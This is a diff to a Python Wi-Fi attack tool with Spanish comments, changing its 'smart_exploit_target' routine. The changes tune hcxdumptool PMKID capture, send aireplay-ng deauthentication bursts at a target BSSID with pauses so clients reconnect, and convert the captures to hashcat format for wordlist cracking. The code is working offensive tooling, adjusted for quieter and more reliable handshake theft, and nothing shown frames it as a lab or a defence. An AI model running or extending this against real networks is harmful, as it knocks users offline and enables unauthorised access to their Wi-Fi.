@@ -4900,17 +4900,18 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                 f"hcxdumptool -i {iface} -o {pcap} "
                 f"--filterlist_ap={bssid} --filtermode=2 "
                 f"--active_beacon --enable_status=3 2>/dev/null",
-                shell=True
+                shell=True,
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
-            # Progreso durante captura (30s)
-            for tick in range(30):
-                eng.update_phase(5 + int(tick / 30 * 45))
+            # Progreso durante captura (45s — más tiempo = más probabilidad de PMKID)
+            for tick in range(45):
+                eng.update_phase(5 + int(tick / 45 * 45))
                 time.sleep(1)
             capture_proc.terminate(); capture_proc.wait()
             eng.update_phase(55)
 
             if os.path.exists(pcap) and check_tool("hcxpcapngtool"):
-                run(f"hcxpcapngtool -o {hc22} {pcap} 2>/dev/null")
+                run(f"hcxpcapngtool -o {hc22} {pcap} 2>/dev/null", capture=True)
             if os.path.exists(hc22) and os.path.getsize(hc22) > 0:
                 pmkid_hc = hc22
                 ok(f"PMKID capturado: {hc22}")
@@ -4960,13 +4961,14 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
             shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
         eng.update_phase(10)
-        time.sleep(4)
+        time.sleep(6)  # dar tiempo al airodump para sincronizar
 
-        # 3 rondas de deauth con intensidad creciente (10 → 30 → 50 paquetes)
-        for round_n, deauth_count in enumerate([10, 30, 50], 1):
+        # 3 rondas de deauth suaves (5 → 10 → 15 paquetes) con pausa larga entre rondas
+        for round_n, deauth_count in enumerate([5, 10, 15], 1):
             eng.update_phase(10 + round_n * 20)
-            run(f"aireplay-ng -0 {deauth_count} -a {bssid} {iface} 2>/dev/null")
-            time.sleep(4)
+            run(f"aireplay-ng -0 {deauth_count} -a {bssid} {iface} 2>/dev/null",
+                capture=True)
+            time.sleep(8)  # pausa larga para que el cliente se reconecte
             # Verificar si ya hay handshake
             cap_list = [f for f in os.listdir("exploit-engine")
                         if f.startswith(f"hs_{essid_s}") and f.endswith(".cap")]
@@ -4995,7 +4997,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         _gen_ssid_wordlist(essid, ssid_wl)
         hc_file = cap_file.replace(".cap", ".hc22000")
         if check_tool("hcxpcapngtool"):
-            run(f"hcxpcapngtool -o {hc_file} {cap_file} 2>/dev/null")
+            run(f"hcxpcapngtool -o {hc_file} {cap_file} 2>/dev/null", capture=True)
         eng.update_phase(10)
 
         rules_paths = [
